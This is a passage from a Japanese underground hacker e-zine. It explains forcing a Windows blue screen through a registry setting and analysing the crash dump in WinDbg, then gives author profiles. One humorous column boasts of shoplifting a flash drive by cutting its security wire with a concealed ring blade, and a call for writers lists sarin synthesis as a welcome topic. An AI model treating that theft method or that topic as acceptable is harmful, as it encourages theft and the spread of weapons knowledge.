+まして、今回のネタはその時に使ったソースコードを流用してます（笑。内容は
+前回よりさらに難しくなってますけど、それはネタが切れてきたということです。
+正直もうネタ切れです。次回はたぶんLinuxの記事になると思います(^^;。さて、
+最後になりましたがここまで付き合って読んでくださった方本当に有り難うござ
+いました。
+
+　では、また会う日まで...
+
+
+■0x06.) 参考文献
+
+・『Advanced Windows』Jeffrey Richter著
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第３章：ブルースクリーンと仲良くなろうよ ---
+
+著者：IPUSIRON
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) ブルースクリーンって何？
+
+　一言でWindowsといっても、95/98/Me/NT/2000/XP/2003といった様々なバージョ
+ンが存在します。これをまとめてWindowsファミリー、95/98/MeをWindows9xシリ
+ーズ、NT/2000/XP/2003をWindowsNTシリーズと呼ぶことにします。
+　自分では何も問題の無いと思って操作を行ったのに、画面が勝手に青くなり、
+強制終了を促される現象を知っているでしょうか。Windows9xシリーズを使ったこ
+とがある方ならば、一度は体験したことがあることでしょう（下手したら100回は
+超える人も･･･）。ここで、「自分では何も問題の無いと思った操作」というのが
+肝です。自分では問題無いと思っても、PC側にとっては問題があったわけです。
+なぜ、このような食い違いが起こるのかというと、ユーザーは何気なくソフトウ
+ェアを操作している一方、そのソフトウェアにバグがあって、本来アクセスして
+はならないWindowsの心臓部（厳密に言えば、カーネル部分）を書き換えたりして
+しまい、異常状態を引き起こしてしまうからです。
+　異常状態になってしまうと、Windowsがこのことをユーザーに知らせるために、
+画面を青くします。もう少し詳細に言うと、Windowsファミリーはカーネルがクラ
+ッシュ（パニック）してしまうと、ディスプレイがVGAモードに切り替わって、青
+い画面になる仕様になっているわけです。この画面が青くなる現象を一般的には
+ブルースクリーン、正式にはBSOD（Blue Screen Of Death）と呼びます。
+
+
+■0x02.) Windows9xシリーズでブルースクリーンになったらどうするか
+
+　諦めてください（笑）。Windows9xシリーズでブルースクリーンになってしまっ
+た場合、諦めて[Ctrl]+[Alt]+[Del]を連打で再起動するしかありません。しかも、
+ブルースクリーンになった原因を突き止めることも困難です。
+　ユーザーにとってできることは、使用しなくなったアプリケーションはこまめ
+にアンインストール、インストールしたら急におかしくなったらそのアプリケー
+ションは使用しないといったことぐらいでしょう。一番よいのは、再インストー
+ルして、最低限のアプリケーションしかインストールしないことでしょう。
+
+
+■0x03.) WindowsNTシリーズでブルースクリーンになったらどうするか
+
+　WindowsNTシリーズの場合、画面に残されたメッセージを解読することでブルー
+スクリーンの原因を突き止めることができます。また、OSのクラッシュダンプを
+採取できるので、これを基に詳細を知ることもできます。
+
+　「え？　WindowsNTシリーズではブルースクリーンを見たことがないって？　」
+　ブルースクリーンは、カーネル空間内で何らかの原因で障害が発生したときに
+表示されるものなので、もしかしたらブルースクリーンを見たことが無い人もい
+ることでしょう。それに、マーフィーの法則ではありませんが、見たくないとき
+に限って表示され、実験で見たい思うときに限って表示されないものです。
+　そこで、意図的にブルースクリーンを発生させる方法を教えておきます。この
+方法が適用できる条件を次に列挙します。
+・Windows2000/XPのみ
+・PS/2のキーボードのみ（USBは不可）
+・レジストリエディタの操作が分かる能力
+
+　では、方法を示します。
+
+1：レジストリエディタを起動します。「HKEY_LOCAL_MACHINE\SYSTEM\CurrentCo
+ntrolSet\Services\i8042prt\Parameters」キーに、新規でDWORD値で「CrashOnC
+trlScroll」、その値を「1」として追加します。ちなみに、「i8042prt」はPS/2
+のキーボードとマウスを制御するIntel8042ポートドライバのことです。
+
+2：レジストリエディタを終了して、マシンを再起動します。
+
+3：再起動後、うまくいけば、[右Ctrl]キーを押しながら[ScrollLock]キーを2回
+押せば、ブルースクリーンを意図的に起こすことができます。
+
+　ちょっと待ってください。ブルースクリーンを発生する作業は終わりましたが、
+デフォルトでは自動的に再起動するように設定されているので、画面に表示され
+たメッセージを読み取ることができません。そこで、自動的に再起動しないよう
+に設定しておきましょう。
+
+1：「コントロールパネル」内の「システム」をダブルクリックします。
+
+2：「システムのプロパティ」が表示されるので、「詳細」タブ＞「起動/回復」
+ボタンを押します。
+
+3：「起動/回復」ウィンドウが表示されたら、「システムエラー」部分の「自動
+的に再起動する」のチェックボックスのチェックをはずします。そして、「シス
+テムログにイベントを書き込む」（後でこのイベントを表示する方法を言及する）
+と「管理警告を送信する」のチェックボックスにチェックを入れておきます。
+
+4：設定後、[OK]ボタンを押します。再起動を促されますので、再起動しておきま
+しょう。
+
+　これで準備ができました。[右Ctrl]キーを押しながら[ScrollLock]キーを2回押
+して、ブルースクリーンを意図的に起こしてみましょう（ブルースクリーン後は
+マシンのリセットボタンしかないので、あからじめ心の準備をしておくこと）。
+このとき表示されるメッセージは次のようになっているはずです。
+
+-----
+*** STOP: 0x000000E2 (0x00000000,0x00000000,0x00000000,0x00000000)
+
+The end-user manually generated the crach dump.
+
+Beginning dump of physical memory
+Physical memory dump complete. Contact your system administrator or thechnical support group.
+-----
+
+　1行目に着目してください。
+
+-----
+0x000000E2 (0x00000000,0x00000000,0x00000000,0x00000000)
+-----
+
+　この英数字列（0xとなっているので16進数表示）がブルースクリーンが発生し
+た原因を突き止めるヒントとなるわけです。この英数字が何を意味しているかは、
+MSのWebサイトで配布されているDDK（Driver Development Kit）というデバイス
+ドライバ開発キットをインストールして、「DDK Documentation」というヘルプフ
+ァイルを参照することで分かります(*1)。
+
+DDKのトップページ：http://www.microsoft.com/japan/whdc/ddk/winddk.mspx
+FAQ：http://www.microsoft.com/japan/whdc/ddk/ddkfaq.mspx
+
+　このURIから、DDKをダウンロードして、インストールします。と言いたいとこ
+ろですが、現在は残念ながらダウンロードできないようです。Windows2000用のD
+DKはServer 2003 DDKのCD-ROMに含まれます。このCD-ROM自体はタダですが、送料
+で25$かかります。
+
+　現在は、「Debugging Tools for Windows」というツールの中に「DDK Documen
+tation」が含まれているので、これを次のURIからダウンロードします。今回はベ
+ータ版であるVersion 6.3.11（2004年3月1日）を利用することにします。
+
+http://www.microsoft.com/japan/whdc/ddk/debugging/default.mspx
+
+　「Debugging Tools for Windows ベータ版のダウンロード」というリンクをク
+リックします。WindowsNTの方はまず「Install Windows Installer 1.1 (Window
+s NT 4.0 - x86) 1.4MB」をあらかじめインストールしておく必要があります。W
+indows2000/XPなどの場合、これは省いて「Install 32-bit Beta Version 6.3.1
+1 (March 1, 2004) 10MB」をインストールするだけでOKです。
+
+　それでは、「Debugging Tools for Windows」のインストールが終わったとしま
+す。
+
+　「スタート」メニュー＞「プログラム」＞「Debugging Tools for Windows」＞
+「Debugging Help」を起動します。
+　「Debugging Tools for Windows」＞「Bug Checks (Blue Screens)」＞「Bug 
+Check Code Reference」でバグチェックコードを確認できます。意図的に引き起
+こしたブルースクリーンのバグチェックコードは、1行目の先頭部分の「0x00000
+0E2」です。この項目は次のようになっています。
+
+-----
+Bug Check 0xE2: MANUALLY_INITIATED_CRASH
+[This is preliminary documentation and subject to change.] 
+
+The MANUALLY_INITIATED_CRASH bug check has a value of 0x000000E2. This indicates that the user deliberately initiated a crash dump from either the kernel debugger or the keyboard.
+
+Parameters
+None
+
+Comments
+For details on manually-initiated crash dumps, see Forcing a System Crash.
+-----
+
+　つまり、これは「MANUALLY_INITIATED_CRASH」という意味であることが判明し
+ます。
+
+
+　なぜ、意図的にブルースクリーンを発生する仕組みが存在するのかというと、
+OSがストールしてしまったときに、メモリダンプを採取して解析できるようにす
+るためです。
+
+(*1) 前はMSDNに加入していなければ入手できませんでしたが、現在はフリーで使
+えます。
+
+
+■0x04.) メモリダンプと戯れる
+
+　バグチェックコードでブルースクリーンの原因である概要が分かりますが、詳
+細はまだ分かりません。そこで「Debugging Tools for Windows」に付属している
+「Windows Debugger」（WinDdg）を用いて、保存したイベント（ここではクラッ
+シュしたイベントなのでクラッシュダンプと呼ぶことにする）をダンプします。
+
+　クラッシュダンプはデフォルトで「%SystemRoot%\Minidump」に保存されている
+はずです。保存場所を変更するには、前述した「起動/回復」ウィンドウで変更で
+きます。しかし、デフォルトのままでは「デバッグ情報の書き込み」の部分が「
+最小メモリダンプ（64KB）」になっています。これではダンプ量が少なく、情報
+量を少ないので、「カーネルメモリダンプ」に変更しておきましょう。「完全メ
+モリダンプ」にすれば全てのメモリのダンプを行いますが、そこまでする必要は
+めったにないでしょう。詳細は次のURIで確認できます。
+
+http://support.microsoft.com/default.aspx?scid=kb;ja;254649
+
+　ただし、HDDの容量は最低限「物理メモリ＋1MB」が必要になります。なぜなら
+ば、クラッシュダンプは一旦ページングファイル（「C:\pagefile.sys」に位置す
+る）に採取されされ、その後にOS起動時に指定した保存先にコピーされる仕組み
+になっているからです。
+　2GB以上のメモリを積んでいるマシンの場合注意すべき点があります。これに関
+しては次のURIを参考にしてください。
+
+http://support.microsoft.com/default.aspx?scid=kb;ja;274598
+http://support.microsoft.com/default.aspx?scid=kb;JA;241046
+
+　それではデバッガでクラッシュメモリを読み込んで見ましょう。
+　まず、WinDdgを起動します。そして、メニューの「File」＞「Open Crash Dum
+p」で、「MEMORY.DMP」ファイルを指定します。ここでは意図的に引き起こしたブ
+ルースクリーンのクラッシュメモリを使います。すると、次のように表示される
+はずです。
+
+-----
+Microsoft (R) Windows Debugger  Version 6.3.0011.2
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+
+Loading Dump File [G:\MEMORY.DMP]
+Kernel Summary Dump File: Only kernel address space is available
+
+************************************************************************
+WARNING: Dump file has inconsistent set-bit count.  Data may be missing.
+************************************************************************
+Symbol search path is: *** Invalid ***
+****************************************************************************
+* Symbol loading may be unreliable without a symbol search path.           *
+* Use .symfix to have the debugger choose a symbol path.                   *
+* After setting your symbol path, use .reload to refresh symbol locations. *
+****************************************************************************
+Executable search path is: 
+*********************************************************************
+* Symbols can not be loaded because symbol path is not initialized. *
+*                                                                   *
+* The Symbol Path can be set by:                                    *
+*   using the _NT_SYMBOL_PATH environment variable.                 *
+*   using the -y <symbol_path> argument when starting the debugger. *
+*   using .sympath and .sympath+                                    *
+*********************************************************************
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for ntoskrnl.exe - 
+Windows 2000 Kernel Version 2195 (Service Pack 4) UP Free x86 compatible
+Product: WinNt
+Kernel base = 0x80400000 PsLoadedModuleList = 0x8046e8f0
+Debug session time: Fri May 21 13:25:36 2004
+System Uptime: 0 days 0:02:38.203
+*********************************************************************
+* Symbols can not be loaded because symbol path is not initialized. *
+*                                                                   *
+* The Symbol Path can be set by:                                    *
+*   using the _NT_SYMBOL_PATH environment variable.                 *
+*   using the -y <symbol_path> argument when starting the debugger. *
+*   using .sympath and .sympath+                                    *
+*********************************************************************
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for ntoskrnl.exe - 
+Loading Kernel Symbols
+........................................................................................Page aee4 not present in the dump file. Type ".hh dbgerr004" for details
+.Page ba44 not present in the dump file. Type ".hh dbgerr004" for details
+...................................
+Loading unloaded module list
+.......
+Loading User Symbols
+*******************************************************************************
+*                                                                             *
+*                        Bugcheck Analysis                                    *
+*                                                                             *
+*******************************************************************************
+
+Use !analyze -v to get detailed debugging information.
+
+BugCheck E2, {0, 0, 0, 0}
+
+***** Kernel symbols are WRONG. Please fix symbols to do analysis.
+
+*** ERROR: Module load completed but symbols could not be loaded for i8042prt.sys
+Probably caused by : i8042prt.sys ( i8042prt+1dc3 )　←ここに着目。
+
+Followup: MachineOwner
+-----
+
+　下から3行目の「i8042prt.sys」に着目してください。「i8042prt.sys」はキー
+ボードドライバです。つまり、バグチェックコードによる推測、意図的に起こし
+た[右Ctrl]ボタンを押しながら[ScrollLock]キーを2回押したことと合致します。
+
+　コマンド入力欄に次のように入力してみます（厳密にはkdモードのとき、入力
+欄に「!analyze -v」）。これでより詳細な情報をチェックできます。詳細な使い
+方はヘルプ（英語）を参照してください。
+
+-----
+kd> !analyze -v
+*******************************************************************************
+*                                                                             *
+*                        Bugcheck Analysis                                    *
+*                                                                             *
+*******************************************************************************
+
+MANUALLY_INITIATED_CRASH (e2)
+The user manually initiated this crash dump.
+Arguments:
+Arg1: 00000000
+Arg2: 00000000
+Arg3: 00000000
+Arg4: 00000000
+
+Debugging Details:
+------------------
+
+***** Kernel symbols are WRONG. Please fix symbols to do analysis.
+
+
+BUGCHECK_STR:  MANUALLY_INITIATED_CRASH
+
+DEFAULT_BUCKET_ID:  DRIVER_FAULT
+
+LAST_CONTROL_TRANSFER:  from eb081b38 to eb081dc3
+
+STACK_TEXT:  
+WARNING: Stack unwind information not available. Following frames may be wrong.
+80473eac eb081b38 85d26500 85e3d101 00000000 i8042prt+0x1dc3
+80473f0c 80469e5a 85c27d08 85d264e0 85e3d102 i8042prt+0x1b38
+80473f24 8046fff0 ffdff000 0000000c 00000000 nt!KeSynchronizeExecution+0x15a
+8046fd60 00000000 8046fd68 8046fd68 8046fd70 nt!HalPrivateDispatchTable+0xc38
+
+
+FOLLOWUP_IP: 
+i8042prt+1dc3
+eb081dc3 5e               pop     esi
+
+SYMBOL_STACK_INDEX:  0
+
+FOLLOWUP_NAME:  MachineOwner
+
+SYMBOL_NAME:  i8042prt+1dc3
+
+MODULE_NAME:  i8042prt
+
+IMAGE_NAME:  i8042prt.sys
+
+DEBUG_FLR_IMAGE_TIMESTAMP:  3e25b9e5
+
+STACK_COMMAND:  kb
+
+BUCKET_ID:  WRONG_SYMBOLS
+
+Followup: MachineOwner
+-----
+
+
+■0x05.) おわりに
+
+　今月の講座はいかがでしたでしょうか。
+　Windows嫌いが多いことは事実ですが、現実問題としてWindows無しでは業務が
+できない方が大半だと思います。Windowsがユーザーに対して歩み寄りしてこない
+ならば、ユーザーである我々がWindowsに対して歩み寄るしかないような気もしま
+す。この講座を読んで、Windowsと少しでも心を近づけることができた人がひとり
+でも増えたら本望です。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第４章：今、欲しいハードウエア ---
+
+著者：MaD
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) 編集からのひとこと
+
+　プロフィールに今、欲しいハードウェアを買いて欲しいと電話で言ったはずで
+すが、まどさんが勘違いしたのかメイン原稿に持ってきたので、このままここに
+記載することにしました（笑）。
+
+
+■0x02.) 今、一番万引きしたいハードウエア
+
+　今、一番万引きしたいハードウエアにしていい？
+　今、一番万引きしたいのは「フラッシュメモリー512MB」。これしかない。
+　実は、先日、ソクマッフのＰＣ館を、いつものように小型カッターを持ってウ
+ロウロしてたの。ぼくの小型カッターって、指輪に仕掛けがあって、出したいと
+きに刃先だけがニョキ～って出る特注のやつ。
+　話が反れたけど、そこで「フラッシュメモリー512MB」が、ピアノ線みたいので
+縛られてブラ下がってたから、見てる振りしながら、シャキーンって切って、自
+由にしてあげたの。だって可愛そうじゃん。デブの汗臭いヲタとかに一日中イジ
+られるわけだしさ。キレイなお姉さんに一日中いじられまくるなら、そのままそ
+っとしておいてあげるんだけど。まどさんはいい人なんだ。
+　話が反れたけど（汗）。んで、毎度のようにバレるわけもなく、というか、バ
+レても「おかしな線をつけてるから手に絡まったんやろが、これをどうしてくれ
+んねや！まぁ、おまいら下っ端はアホやから許したるけど、タコ焼き喰うくらい
+の詫びくらい入れやなあかんぞ」っていうもん。
+　話が反れたけど（油汗）。なに話してたっけ？　興奮してしもた（笑）。
+　あぁ、フラッシュメモリー512MBの話。それをルンルンしながら持ち帰って、挿
+してみたのよ。アクセスランプもつかず、マウントもしない。
+　おいちゃん、ちょっとだけ油汗でたのよ。
+　んで、分解してみたの。
+
+　http://ruffnex.oc.to/dam/unko.jpg
+
+　写真見にくいからわかりにくいけど、基板しかないダミーでした。
+　ソクマッフに騙されたやんけ！
+　で、おっちゃんはブチ切れ！　これでソクマッフは信用できないことがわかっ
+た！
+　お返しに、次回は箱入り「フラッシュメモリー1GB」の刑じゃ。
+
+　今回の話で、ソクマッフとは信用できないとこだということがわかっていただ
+ければ、おいちゃんは幸いである（危ない28号風締め｝。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+ --- 第５章：お知らせ ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○Wizard Bible（http://2600ch.com/）では随時、執筆ライターを募集していま
+す。
+　扱う内容のテーマは広義での「under ground」です。例えば、ハッキングから
+サリンガスの合成法などと幅広い内容を考えています。また、各種、特殊な職業
+や趣味を持った方のレクチャーなども含まれます。
+　一回きりでも構いません。また、必ず、毎回連載する義務もありませんのでで
+きる範囲で構いません。気軽に声をかけてください。もちろん一回書いたことが
+ある人も気軽に声をかけてください（全く気にしていない性格なので）。
+
+○Kenji AikoさんがQ&Aを作ってくれました。初めて参加する人でもわかりやすく
+書かれていますので、参考にしてください。
+
+http://akademeia.info/wizardbible/wbQandA.html
+
+○支援者、参加希望者用のスレッドを立てました。
+
+http://ruffnex.oc.to/ipusiron/cgi/forum/patio.cgi?mode=view&no=17
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  ---- 第６章：著者プロフィール ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+　今回は各著者に今欲しいハードウェアを紹介してもらいました。
+
+■J-Klein
+●Job:酒呑み
+●Web:- Mac Freaks -（http://members.jcom.home.ne.jp/j-klein/）
+●Mail: j-klein@jcom.home.ne.jp
+●Team（Group）:N/A
+●欲しいPC関連のハードウェア
+・ノートパソコン
+　持ち運びたいという欲求ではなく、部屋でソファに座ってネットしたいな、と。
+　いすに座ってるのが苦痛に感じてきた今日この頃なのです。
+・GPS
+　NetStumbler+GPSで遊びたい。遊び方は下記URLあたりをどうぞ。
+　http://www.itmedia.co.jp/news/0301/07/nj00_btgps.html
+・Webカメラ
+　うちの猫を遠隔監視したい！
+
+■Kenji Aiko
+●Job: Student
+●Web: http://ruffnex.oc.to/kenji/
+●Mail: kenjinet@s26.xrea.com
+●Team（Group): N/A
+●Comment:
+　どうも。Kenjiです。ついにWizardBibleもvol.10ですね。おめでとうございま
+す。個人的にはvol.1000くらいまで続いてほしいと思っていますが、単純に計算
+してもvol.1000まであと８０年くらいかかるようなので、さすがに私はこの世に
+いないだろうということで、とりあえずこれから約８年後のvol.100を読めたらい
+いなと思っています(^^;。
+●欲しいPC関連のハードウェア
+　マウス！　あの、中に丸いやつが入ってない、赤外線的なもので移動を感知す
+るやつが欲しいです。もちろんボタン３つ（くるくる回るやつも含む）。ある程
+度大きくて、しかも軽い。クリックの幅が狭い。などなどを兼ね備えた究極のマ
+ウスが欲しいです（笑）。ＰＣを使う人にとって、キーボードとマウスの操作性
+ってやっぱり気になりますよね。
+
+■MaD
+●Job:DATA HOUSE
+●Web:http://www.data-house.co.jp/
+●Mail:mad@data-house.co.jp
+●Team（Group）:secret
+●Comment:
+　元ハカージャパソと危ない28号の百円ライター。趣味は、空き缶拾いと牛乳瓶
+のフタ集め。２ちゃんねるでは「矢崎マサユキ」、「白鶴・丸」、「大同曲芸人
+」、「泥棒・詐欺師」として通っている。ウソばかりつくので友達はいない。
+　現在は会社でヒッキーをしているが、将来はネットカフェの店員なるという目
+標に向かってまっしぐら。とぁっ！(`Д´)。
+●欲しいPC関連のハードウェア
+　本文参照。
+
+■IPUSIRON
+●Job:サイト更新
+●Web:- Security Akademeia -（http://akademeia.info/）
+●Mail:ipusiron@ruffnex.oc.to
+●Team（Group）:TeamSA
+●Comment:
+　最近では、リネ２と原稿の両立に四苦八苦しています。今回でvol.10のWizard 
+Bibleですが、これも執筆者・読者のおかげです。これからもWizard Bibleをよろ
+しくお願いします。
+　Winnyの不当逮捕について、原稿をWizard Bibleに投稿してくれる人募集してま
+す。
+●欲しいPC関連のハードウェア
+・リネ２用の高スペックのマシン。
+　クロニクル1まで後約1ヶ月。人がいっぱいいるだろうと思われる戦争でも絶え
+うるグラフィックボード、メモリ、CPUを持つ高スペックマシンが欲しいですね。
